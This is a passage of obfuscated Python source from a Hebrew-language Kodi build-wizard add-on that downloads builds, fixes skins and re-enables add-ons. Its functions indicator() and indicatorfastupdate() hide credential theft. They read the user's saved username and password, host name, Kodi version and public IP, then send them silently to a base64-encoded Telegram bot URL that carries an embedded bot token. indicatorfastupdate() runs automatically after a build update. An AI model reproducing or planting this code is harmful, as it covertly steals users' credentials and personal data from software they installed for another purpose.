    logging .warning (OO00000000OOOO0OO +'&'+O00O0OOO0000O0O0O )#line:3386
    O0O00OOO00OO00O0O =O0OOOOO0OO00O0O00 .open (OO00000000OOOO0OO +'&'+O00O0OOO0000O0O0O )#line:3387
    OOOOOO0O0O00OOOO0 =O0O00OOO00OO00O0O .read ()#line:3388
    for OOO0OOO0OOO0O0000 in O00O0OOO00OOO0O00 :#line:3390
         logging .warning (OOO0OOO0OOO0O0000 )#line:3391
    O0O00O00000OOO000 =O000O0O0O00O00OOO (O00O0OOO00OOO0O00 )#line:3392
    logging .warning (O0O00O00000OOO000 )#line:3393
    if O0O00O00000OOO000 :#line:3394
        OO0O0OOO0000000OO ={'id':O0O00O000OOO00000 ,'confirm':O0O00O00000OOO000 }#line:3395
        O0OO0000O0OOOOO0O ={'Access-Control-Allow-Headers':'Content-Length'}#line:3396
        O00O0OOO0000O0O0O =urllib .urlencode (OO0O0OOO0000000OO )#line:3397
        O0O00OOO00OO00O0O =O0OOOOO0OO00O0O00 .open (OO00000000OOOO0OO +'&'+O00O0OOO0000O0O0O )#line:3398
        chunk_read (O0O00OOO00OO00O0O ,report_hook =chunk_report ,dp =O00O0OOOO0OO00000 ,destination =OO0OOOO0OO0OOO000 ,filesize =O000O0000000O000O )#line:3399
    return (OO0OOOO000OO00O00 )#line:3403
def kodi17Fix ():#line:3404
	OO0O0OO000OO0OO0O =glob .glob (os .path .join (ADDONS ,'*/'))#line:3405
	OOO000O000OOO000O =[]#line:3406
	for O0O00OO0OO00000OO in sorted (OO0O0OO000OO0OO0O ,key =lambda O00OOO0OO00OOOOOO :O00OOO0OO00OOOOOO ):#line:3407
		OOO000OOO0O00000O =os .path .join (O0O00OO0OO00000OO ,'addon.xml')#line:3408
		if os .path .exists (OOO000OOO0O00000O ):#line:3409
			OO000O0OO00O00OO0 =O0O00OO0OO00000OO .replace (ADDONS ,'')[1 :-1 ]#line:3410
			OOO00000O0OO000O0 =open (OOO000OOO0O00000O )#line:3411
			OO0OO0000OO0O000O =OOO00000O0OO000O0 .read ()#line:3412
			OOO0000000O0OOO0O =parseDOM (OO0OO0000OO0O000O ,'addon',ret ='id')#line:3413
			OOO00000O0OO000O0 .close ()#line:3414
			try :#line:3415
				OO0O0OOO0O0O0OOOO =xbmcaddon .Addon (id =OOO0000000O0OOO0O [0 ])#line:3416
			except :#line:3417
				try :#line:3418
					log ("%s was disabled"%OOO0000000O0OOO0O [0 ],xbmc .LOGDEBUG )#line:3419
					OOO000O000OOO000O .append (OOO0000000O0OOO0O [0 ])#line:3420
				except :#line:3421
					try :#line:3422
						log ("%s was disabled"%OO000O0OO00O00OO0 ,xbmc .LOGDEBUG )#line:3423
						OOO000O000OOO000O .append (OO000O0OO00O00OO0 )#line:3424
					except :#line:3425
						if len (OOO0000000O0OOO0O )==0 :log ("Unabled to enable: %s(Cannot Determine Addon ID)"%OO000O0OO00O00OO0 ,xbmc .LOGERROR )#line:3426
						else :log ("Unabled to enable: %s"%O0O00OO0OO00000OO ,xbmc .LOGERROR )#line:3427
	if len (OOO000O000OOO000O )>0 :#line:3428
		O0O0OOO0OOOO0O0OO =0 #line:3429
		DP .create (ADDONTITLE ,'[COLOR %s]Enabling disabled Addons'%COLOR2 ,'','Please Wait[/COLOR]')#line:3430
		for O0O0OO0O00OO0O0OO in OOO000O000OOO000O :#line:3431
			O0O0OOO0OOOO0O0OO +=1 #line:3432
			OO0O00OO0OO00O0OO =int (percentage (O0O0OOO0OOOO0O0OO ,len (OOO000O000OOO000O )))#line:3433
			DP .update (OO0O00OO0OO00O0OO ,"","Enabling: [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OO0O00OO0O0OO ))#line:3434
			addonDatabase (O0O0OO0O00OO0O0OO ,1 )#line:3435
			if DP .iscanceled ():break #line:3436
		if DP .iscanceled ():#line:3437
			DP .close ()#line:3438
			LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Enabling Addons Cancelled![/COLOR]"%COLOR2 )#line:3439
			sys .exit ()#line:3440
		DP .close ()#line:3441
	forceUpdate ()#line:3442
def indicator ():#line:3444
       try :#line:3445
          import json #line:3446
          wiz .log ('FRESH MESSAGE')#line:3447
          O0O00OOO0000000O0 =(ADDON .getSetting ("user"))#line:3448
          OOOOOO0O0OOOO0OOO =(ADDON .getSetting ("pass"))#line:3449
          OO0O00O0O0O00O000 =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3450
          OOOOO0O000O00O0O0 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDc1MDEwMDI1NjpBQUVJVnpTSndOM2t6T25EV0F3Yi1LTkk3VUREY2N6aEx6VS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0xMDAxNDE1ODcxNzk3JnRleHQ915TXqten15nXnyDXkNeqINeU15HXmdec15Mg16nXnNeaIA=='#line:3451
          O0OO00OOO0OO0000O =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3452
          OOOOO00O000O0OOO0 =str (json .loads (O0OO00OOO0OO0000O )['ip'])#line:3453
          OO0O0O00OOO00OOO0 =O0O00OOO0000000O0 #line:3454
          OO00O0O0000O00000 =OOOOOO0O0OOOO0OOO #line:3455
          import socket #line:3456
          O0OO00OOO0OO0000O =urllib2 .urlopen (OOOOO0O000O00O0O0 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO0O0O00OOO00OOO0 +' - '+OO00O0O0000O00000 +' - '+OO0O00O0O0O00O000 +' - '+OOOOO00O000O0OOO0 ).readlines ()#line:3457
       except :pass #line:3459
def indicatorfastupdate ():#line:3460
       try :#line:3461
          import json #line:3462
          wiz .log ('FRESH MESSAGE')#line:3463
          OOO000O0OO000O0O0 =(ADDON .getSetting ("user"))#line:3464
          OOO0O0OO00O0OOOO0 =(ADDON .getSetting ("pass"))#line:3465
          OO00OOOOO00O0O00O =(xbmc .getInfoLabel ("System.BuildVersion")[:4 ])#line:3466
          OOO0OO00000000000 ='aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDk2Nzc3MjI5NzpBQUhndG1zWEotelVMakM0SUFmNHJKc0dHUlduR09ZaFhORS9zZW5kTWVzc2FnZT9jaGF0X2lkPS0yNzQyNjIzODkmdGV4dD0g16LXqdeUINei15PXm9eV158g157XlNeZ16gg'#line:3468
          OO0000000O00O0OO0 =urllib2 .urlopen ('https://api.ipify.org/?format=json').read ()#line:3469
          OOO0OO0000OO0OOO0 =str (json .loads (OO0000000O00O0OO0 )['ip'])#line:3470
          OO000OOO0OOOOO00O =OOO000O0OO000O0O0 #line:3471
          OO00OO00O0O0O00OO =OOO0O0OO00O0OOOO0 #line:3472
          import socket #line:3474
          OO0000000O00O0OO0 =urllib2 .urlopen (OOO0OO00000000000 .decode ('base64')+' - '+(socket .gethostbyaddr (socket .gethostname ())[0 ])+' - '+OO000OOO0OOOOO00O +' - '+OO00OO00O0O0O00OO +' - '+OO00OOOOO00O0O00O +' - '+OOO0OO0000OO0OOO0 ).readlines ()#line:3475
       except :pass #line:3477
def skinfix18 ():#line:3478
	if KODIV >=18 and os .path .exists (os .path .join (ADDONS ,SKINID18 )):#line:3479
		O0OOOOOOOOOO0O0O0 =wiz .workingURL (SKINID18DDONXML )#line:3480
		if O0OOOOOOOOOO0O0O0 ==True :#line:3481
			O0000000OOO0OOOOO =wiz .parseDOM (wiz .openURL (SKINID18DDONXML ),'addon',ret ='version',attrs ={'id':SKINID18 })#line:3482
			if len (O0000000OOO0OOOOO )>0 :#line:3483
				O00000O00O0OO0OO0 ='%s-%s.zip'%(SKINID18 ,O0000000OOO0OOOOO [0 ])#line:3484
				OO0O00O00000OOOO0 =wiz .workingURL (SKIN18ZIPURL +O00000O00O0OO0OO0 )#line:3485
				if OO0O00O00000OOOO0 ==True :#line:3486
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3487
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3488
					OOO0000O0O00O00OO =os .path .join (PACKAGES ,O00000O00O0OO0OO0 )#line:3489
					try :os .remove (OOO0000O0O00O00OO )#line:3490
					except :pass #line:3491
					downloader .download (SKIN18ZIPURL +O00000O00O0OO0OO0 ,OOO0000O0O00O00OO ,DP )#line:3492
					extract .all (OOO0000O0O00O00OO ,HOME ,DP )#line:3493
					try :#line:3494
						OOO0O0O0O0O0OOOOO =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3495
						OOO00O0OOOO0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3496
						os .rename (OOO0O0O0O0O0OOOOO ,OOO00O0OOOO0O0OO0 )#line:3497
					except :#line:3498
						pass #line:3499
					try :#line:3500
						OO00OO0OOO000O00O =open (os .path .join (ADDONS ,SKINID18 ,'addon.xml'),mode ='r');O00OO00OO0O0OOO0O =OO00OO0OOO000O00O .read ();OO00OO0OOO000O00O .close ()#line:3501
						O0O0OOOOOOO000000 =wiz .parseDOM (O00OO00OO0O0OOO0O ,'addon',ret ='name',attrs ={'id':SKINID18 })#line:3502
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O0OOOOOOO000000 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID18 ,'icon.png'))#line:3503
					except :#line:3504
						pass #line:3505
					if KODIV >=17 :wiz .addonDatabase (SKINID18 ,1 )#line:3506
					DP .close ()#line:3507
					xbmc .sleep (500 )#line:3508
					wiz .forceUpdate (True )#line:3509
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3510
				else :#line:3511
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3512
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%OO0O00O00000OOOO0 ,xbmc .LOGERROR )#line:3513
			else :#line:3514
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3515
		else :#line:3516
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3517
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3518
def skinfix17 ():#line:3519
	if KODIV >=17 and KODIV <18 and os .path .exists (os .path .join (ADDONS ,SKINID17 )):#line:3520
		O0O00O00O00OOOO00 =wiz .workingURL (SKINID17DDONXML )#line:3521
		if O0O00O00O00OOOO00 ==True :#line:3522
			OOOO0O0OO0O000OOO =wiz .parseDOM (wiz .openURL (SKINID17DDONXML ),'addon',ret ='version',attrs ={'id':SKINID17 })#line:3523
			if len (OOOO0O0OO0O000OOO )>0 :#line:3524
				O0OOOOOOOO00OOOOO ='%s-%s.zip'%(SKINID17 ,OOOO0O0OO0O000OOO [0 ])#line:3525
				O0OOOOO0OOOOOOO00 =wiz .workingURL (SKIN17ZIPURL +O0OOOOOOOO00OOOOO )#line:3526
				if O0OOOOO0OOOOOOO00 ==True :#line:3527
					DP .create (ADDONTITLE ,'מתאים את הסקין לקודי שלך, אנא המתן....','','Please Wait')#line:3528
					if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3529
					OO0OO00OO0O00O0OO =os .path .join (PACKAGES ,O0OOOOOOOO00OOOOO )#line:3530
					try :os .remove (OO0OO00OO0O00O0OO )#line:3531
					except :pass #line:3532
					downloader .download (SKIN17ZIPURL +O0OOOOOOOO00OOOOO ,OO0OO00OO0O00O0OO ,DP )#line:3533
					extract .all (OO0OO00OO0O00O0OO ,HOME ,DP )#line:3534
					try :#line:3535
						O0O00O000OO0O0OO0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos116.db")#line:3536
						OO0OOO0OOO00O00O0 =os .path .join (xbmc .translatePath ("special://userdata/"),"Database","MyVideos107.db")#line:3537
						os .rename (O0O00O000OO0O0OO0 ,OO0OOO0OOO00O00O0 )#line:3538
					except :#line:3539
						pass #line:3540
					try :#line:3541
						O0O0O0O0O0OOO0OOO =open (os .path .join (ADDONS ,SKINID17 ,'addon.xml'),mode ='r');O0O0000OOO0O0O0OO =O0O0O0O0O0OOO0OOO .read ();O0O0O0O0O0OOO0OOO .close ()#line:3542
						O000OOO00OO0O00O0 =wiz .parseDOM (O0O0000OOO0O0O0OO ,'addon',ret ='name',attrs ={'id':SKINID17 })#line:3543
						wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,O000OOO00OO0O00O0 [0 ]),"[COLOR %s]Add-on updated[/COLOR]"%COLOR2 ,icon =os .path .join (ADDONS ,SKINID17 ,'icon.png'))#line:3544
					except :#line:3545
						pass #line:3546
					if KODIV >=17 :wiz .addonDatabase (SKINID17 ,1 )#line:3547
					DP .close ()#line:3548
					xbmc .sleep (500 )#line:3549
					wiz .forceUpdate (True )#line:3550
					wiz .log ("[Auto Install Repo] Successfully Installed",xbmc .LOGNOTICE )#line:3551
				else :#line:3552
					wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid url for zip![/COLOR]"%COLOR2 )#line:3553
					wiz .log ("[Auto Install Repo] Was unable to create a working url for repository. %s"%O0OOOOO0OOOOOOO00 ,xbmc .LOGERROR )#line:3554
			else :#line:3555
				wiz .log ("Invalid URL for Repo Zip",xbmc .LOGERROR )#line:3556
		else :#line:3557
			wiz .LogNotify ("[COLOR %s]Repo Install Error[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid addon.xml file![/COLOR]"%COLOR2 )#line:3558
			wiz .log ("[Auto Install Repo] Unable to read the addon.xml file.",xbmc .LOGERROR )#line:3559
def fix17update ():#line:3560
	if KODIV >=17 and KODIV <18 :#line:3561
		wiz .kodi17Fix ()#line:3562
		xbmc .sleep (4000 )#line:3563
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3564
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3565
		fixfont ()#line:3566
		OOO00OOOOO0000O00 =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3567
		try :#line:3569
			O00O0O000O0000O00 =open (OOO00OOOOO0000O00 ,'r')#line:3570
			O00OO0O00OO0OO000 =O00O0O000O0000O00 .read ()#line:3571
			O00O0O000O0000O00 .close ()#line:3572
			O00000O0OO0O0O0OO ='<import addon="xbmc.gui" version="5.14.0(.+?)/>'#line:3573
			OOOO0O0000O00O0OO =re .compile (O00000O0OO0O0O0OO ).findall (O00OO0O00OO0OO000 )[0 ]#line:3574
			O00O0O000O0000O00 =open (OOO00OOOOO0000O00 ,'w')#line:3575
			O00O0O000O0000O00 .write (O00OO0O00OO0OO000 .replace ('<import addon="xbmc.gui" version="5.14.0%s/>'%OOOO0O0000O00O0OO ,'<import addon="xbmc.gui" version="5.12.0"/>'))#line:3576
			O00O0O000O0000O00 .close ()#line:3577
		except :#line:3578
				pass #line:3579
		wiz .kodi17Fix ()#line:3580
		OOO00OOOOO0000O00 =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3581
		try :#line:3582
			O00O0O000O0000O00 =open (OOO00OOOOO0000O00 ,'r')#line:3583
			O00OO0O00OO0OO000 =O00O0O000O0000O00 .read ()#line:3584
			O00O0O000O0000O00 .close ()#line:3585
			O00000O0OO0O0O0OO ='<keyboardlayouts default="true(.+?)/keyboardlayouts>'#line:3586
			OOOO0O0000O00O0OO =re .compile (O00000O0OO0O0O0OO ).findall (O00OO0O00OO0OO000 )[0 ]#line:3587
			O00O0O000O0000O00 =open (OOO00OOOOO0000O00 ,'w')#line:3588
			O00O0O000O0000O00 .write (O00OO0O00OO0OO000 .replace ('<keyboardlayouts default="true%s/keyboardlayouts>'%OOOO0O0000O00O0OO ,'<keyboardlayouts>English QWERTY|Hebrew QWERTY</keyboardlayouts>'))#line:3589
			O00O0O000O0000O00 .close ()#line:3590
		except :#line:3591
				pass #line:3592
		swapSkins ('skin.Premium.mod')#line:3593
def fix18update ():#line:3595
	if KODIV >=18 :#line:3596
		xbmc .sleep (4000 )#line:3597
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"locale.language","value":"resource.language.he_il"}}')#line:3598
		xbmc .executeJSONRPC ('{"jsonrpc":"2.0","method":"Settings.SetSettingValue","id":1,"params":{"setting":"subtitles.font","value":"ntkl.ttf"}}')#line:3599
		fixfont ()#line:3600
		O000OOO00O0OO000O =os .path .join (xbmc .translatePath ("special://home/"),"addons","skin.Premium.mod","addon.xml")#line:3601
		try :#line:3602
			O0OOOO000OOO00000 =open (O000OOO00O0OO000O ,'r')#line:3603
			O00OOO00O00000000 =O0OOOO000OOO00000 .read ()#line:3604
			O0OOOO000OOO00000 .close ()#line:3605
			O00O0OO0OO0OO0O00 ='<import addon="xbmc.gui" version="5.12.0(.+?)/>'#line:3606
			O000OO00000O000OO =re .compile (O00O0OO0OO0OO0O00 ).findall (O00OOO00O00000000 )[0 ]#line:3607
			O0OOOO000OOO00000 =open (O000OOO00O0OO000O ,'w')#line:3608
			O0OOOO000OOO00000 .write (O00OOO00O00000000 .replace ('<import addon="xbmc.gui" version="5.12.0%s/>'%O000OO00000O000OO ,'<import addon="xbmc.gui" version="5.14.0"/>'))#line:3609
			O0OOOO000OOO00000 .close ()#line:3610
		except :#line:3611
				pass #line:3612
		wiz .kodi17Fix ()#line:3613
		O000OOO00O0OO000O =os .path .join (xbmc .translatePath ("special://userdata"),"guisettings.xml")#line:3614
		try :#line:3615
			O0OOOO000OOO00000 =open (O000OOO00O0OO000O ,'r')#line:3616
			O00OOO00O00000000 =O0OOOO000OOO00000 .read ()#line:3617
			O0OOOO000OOO00000 .close ()#line:3618
			O00O0OO0OO0OO0O00 ='<setting id="locale.keyboardlayouts" default="true(.+?)/setting>'#line:3619
			O000OO00000O000OO =re .compile (O00O0OO0OO0OO0O00 ).findall (O00OOO00O00000000 )[0 ]#line:3620
			O0OOOO000OOO00000 =open (O000OOO00O0OO000O ,'w')#line:3621
			O0OOOO000OOO00000 .write (O00OOO00O00000000 .replace ('<setting id="locale.keyboardlayouts" default="true%s/setting>'%O000OO00000O000OO ,'<setting id="locale.keyboardlayouts">English QWERTY|Hebrew QWERTY</setting>'))#line:3622
			O0OOOO000OOO00000 .close ()#line:3623
		except :#line:3624
				pass #line:3625
		swapSkins ('skin.Premium.mod')#line:3626
def buildWizard (OO00000000OO00OOO ,O000OO0O0O0O000O0 ,theme =None ,over =False ):#line:3629
	if over ==False :#line:3630
		O0O0000OOOOO0O0O0 =wiz .checkBuild (OO00000000OO00OOO ,'url')#line:3631
		if O0O0000OOOOO0O0O0 ==False :#line:3633
			xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','אנא המתן')))#line:3637
			xbmc .executebuiltin ("RunPlugin(plugin://plugin.program.Anonymous/?mode=install&name=+Kodi+Premium&url=gui)")#line:3638
			return #line:3639
		O000O0OOO0OO00O00 =wiz .workingURL (O0O0000OOOOO0O0O0 )#line:3640
		if O000O0OOO0OO00O00 ==False :#line:3641
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Build Zip Error: %s[/COLOR]"%(COLOR2 ,O000O0OOO0OO00O00 ))#line:3642
			return #line:3643
	if O000OO0O0O0O000O0 =='gui':#line:3644
		if OO00000000OO00OOO ==BUILDNAME :#line:3645
			if over ==True :O000OO0OO0O00O0O0 =1 #line:3646
			else :O000OO0OO0O00O0O0 =1 #line:3647
		else :#line:3648
			O000OO0OO0O00O0O0 =1 #line:3649
		if O000OO0OO0O00O0O0 :#line:3650
			remove_addons ()#line:3651
			remove_addons2 ()#line:3652
			O00O0OO00000O0O00 =wiz .checkBuild (OO00000000OO00OOO ,'gui')#line:3653
			OO0OOO0O0000O0OO0 =OO00000000OO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3654
			if not wiz .workingURL (O00O0OO00000O0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3655
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3656
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000000OO00OOO ),'','אנא המתן')#line:3657
			OO0OO00OO00O00000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OOO0O0000O0OO0 )#line:3658
			try :os .remove (OO0OO00OO00O00000 )#line:3659
			except :pass #line:3660
			logging .warning (O00O0OO00000O0O00 )#line:3661
			if 'google'in O00O0OO00000O0O00 :#line:3662
			   O0O00000OO0O00OOO =googledrive_download (O00O0OO00000O0O00 ,OO0OO00OO00O00000 ,DP ,wiz .checkBuild (OO00000000OO00OOO ,'filesize'))#line:3663
			else :#line:3666
			  downloader .download (O00O0OO00000O0O00 ,OO0OO00OO00O00000 ,DP )#line:3667
			xbmc .sleep (100 )#line:3668
			O0O0O0OOOO0O000O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000000OO00OOO )#line:3669
			DP .update (0 ,O0O0O0OOOO0O000O0 ,'','אנא המתן')#line:3670
			extract .all (OO0OO00OO00O00000 ,HOME ,DP ,title =O0O0O0OOOO0O000O0 )#line:3671
			DP .close ()#line:3672
			wiz .defaultSkin ()#line:3673
			wiz .lookandFeelData ('save')#line:3674
			wiz .kodi17Fix ()#line:3675
			if KODIV >=18 :#line:3676
				skindialogsettind18 ()#line:3677
			xbmc .executebuiltin ("ReloadSkin()")#line:3678
			if INSTALLMETHOD ==1 :O00O0O0OOO0OOOOO0 =1 #line:3679
			elif INSTALLMETHOD ==2 :O00O0O0OOO0OOOOO0 =0 #line:3680
			else :DP .close ()#line:3681
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]הבילד עודכן בהצלחה![/COLOR]'%COLOR2 )#line:3682
			indicatorfastupdate ()#line:3683
		else :#line:3685
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3686
	if O000OO0O0O0O000O0 =='gui2':#line:3687
		if OO00000000OO00OOO ==BUILDNAME :#line:3688
			if over ==True :O000OO0OO0O00O0O0 =1 #line:3689
			else :O000OO0OO0O00O0O0 =1 #line:3690
		else :#line:3691
			O000OO0OO0O00O0O0 =1 #line:3692
		if O000OO0OO0O00O0O0 :#line:3693
			remove_addons ()#line:3694
			remove_addons2 ()#line:3695
			O00O0OO00000O0O00 =wiz .checkBuild (OO00000000OO00OOO ,'gui')#line:3696
			OO0OOO0O0000O0OO0 =OO00000000OO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3697
			if not wiz .workingURL (O00O0OO00000O0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3698
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3699
			DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000000OO00OOO ),'','אנא המתן')#line:3700
			OO0OO00OO00O00000 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OO0OOO0O0000O0OO0 )#line:3701
			try :os .remove (OO0OO00OO00O00000 )#line:3702
			except :pass #line:3703
			logging .warning (O00O0OO00000O0O00 )#line:3704
			if 'google'in O00O0OO00000O0O00 :#line:3705
			   O0O00000OO0O00OOO =googledrive_download (O00O0OO00000O0O00 ,OO0OO00OO00O00000 ,DP ,wiz .checkBuild (OO00000000OO00OOO ,'filesize'))#line:3706
			else :#line:3709
			  downloader .download (O00O0OO00000O0O00 ,OO0OO00OO00O00000 ,DP )#line:3710
			xbmc .sleep (100 )#line:3711
			O0O0O0OOOO0O000O0 ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000000OO00OOO )#line:3712
			DP .update (0 ,O0O0O0OOOO0O000O0 ,'','אנא המתן')#line:3713
			extract .all (OO0OO00OO00O00000 ,HOME ,DP ,title =O0O0O0OOOO0O000O0 )#line:3714
			DP .close ()#line:3715
			wiz .defaultSkin ()#line:3716
			wiz .lookandFeelData ('save')#line:3717
			if INSTALLMETHOD ==1 :O00O0O0OOO0OOOOO0 =1 #line:3720
			elif INSTALLMETHOD ==2 :O00O0O0OOO0OOOOO0 =0 #line:3721
			else :DP .close ()#line:3722
		else :#line:3724
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]GuiFix: Cancelled![/COLOR]'%COLOR2 )#line:3725
	elif O000OO0O0O0O000O0 =='fresh':#line:3726
		freshStart (OO00000000OO00OOO )#line:3727
	elif O000OO0O0O0O000O0 =='normal':#line:3728
		if url =='normal':#line:3729
			if KEEPTRAKT =='true':#line:3730
				traktit .autoUpdate ('all')#line:3731
				wiz .setS ('traktlastsave',str (THREEDAYS ))#line:3732
			if KEEPREAL =='true':#line:3733
				debridit .autoUpdate ('all')#line:3734
				wiz .setS ('debridlastsave',str (THREEDAYS ))#line:3735
			if KEEPLOGIN =='true':#line:3736
				loginit .autoUpdate ('all')#line:3737
				wiz .setS ('loginlastsave',str (THREEDAYS ))#line:3738
		O0OOO0OOOOOOOOOO0 =int (KODIV );OO0O00OOOOOO0OO00 =int (float (wiz .checkBuild (OO00000000OO00OOO ,'kodi')))#line:3739
		if not O0OOO0OOOOOOOOOO0 ==OO0O00OOOOOO0OO00 :#line:3740
			if O0OOO0OOOOOOOOOO0 ==16 and OO0O00OOOOOO0OO00 <=15 :OO0OOOOO00O0O0O0O =False #line:3741
			else :OO0OOOOO00O0O0O0O =True #line:3742
		else :OO0OOOOO00O0O0O0O =False #line:3743
		if OO0OOOOO00O0O0O0O ==True :#line:3744
			O000O000O000OOO0O =1 #line:3745
		else :#line:3746
			if not over ==False :O000O000O000OOO0O =1 #line:3747
			else :O000O000O000OOO0O =DIALOG .yesno (ADDONTITLE ,'התקנה רגילה:','מצב זה שומר הרחבות קיימות, האם להמשיך?',nolabel ='[B][COLOR red]ביטול[/COLOR][/B]',yeslabel ='[B][COLOR green]המשך[/COLOR][/B]')#line:3748
		if O000O000O000OOO0O :#line:3749
			wiz .clearS ('build')#line:3750
			O00O0OO00000O0O00 =wiz .checkBuild (OO00000000OO00OOO ,'url')#line:3751
			OO0OOO0O0000O0OO0 =OO00000000OO00OOO .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3752
			if not wiz .workingURL (O00O0OO00000O0O00 )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Build Install: Invalid Zip Url![/COLOR]'%COLOR2 );return #line:3753
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3754
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000000OO00OOO ,wiz .checkBuild (OO00000000OO00OOO ,'version')),'','אנא המתן')#line:3755
			OO0OO00OO00O00000 =os .path .join (PACKAGES ,'%s.zip'%OO0OOO0O0000O0OO0 )#line:3756
			try :os .remove (OO0OO00OO00O00000 )#line:3757
			except :pass #line:3758
			logging .warning (O00O0OO00000O0O00 )#line:3759
			if 'google'in O00O0OO00000O0O00 :#line:3760
			   O0O00000OO0O00OOO =googledrive_download (O00O0OO00000O0O00 ,OO0OO00OO00O00000 ,DP ,wiz .checkBuild (OO00000000OO00OOO ,'filesize'))#line:3761
			else :#line:3764
			  downloader .download (O00O0OO00000O0O00 ,OO0OO00OO00O00000 ,DP )#line:3765
			xbmc .sleep (1000 )#line:3766
			O0O0O0OOOO0O000O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s v%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO00000000OO00OOO ,wiz .checkBuild (OO00000000OO00OOO ,'version'))#line:3767
			DP .update (0 ,O0O0O0OOOO0O000O0 ,'','Please Wait')#line:3768
			O0OOO000OOO0O00O0 ,O0OOO0OO0O0OO0OOO ,OO0O0OOO0OOOO00O0 =extract .all (OO0OO00OO00O00000 ,HOME ,DP ,title =O0O0O0OOOO0O000O0 )#line:3769
			if int (float (O0OOO000OOO0O00O0 ))>0 :#line:3770
				wiz .fixmetas ()#line:3771
				wiz .lookandFeelData ('save')#line:3772
				wiz .defaultSkin ()#line:3773
				wiz .setS ('buildname',OO00000000OO00OOO )#line:3775
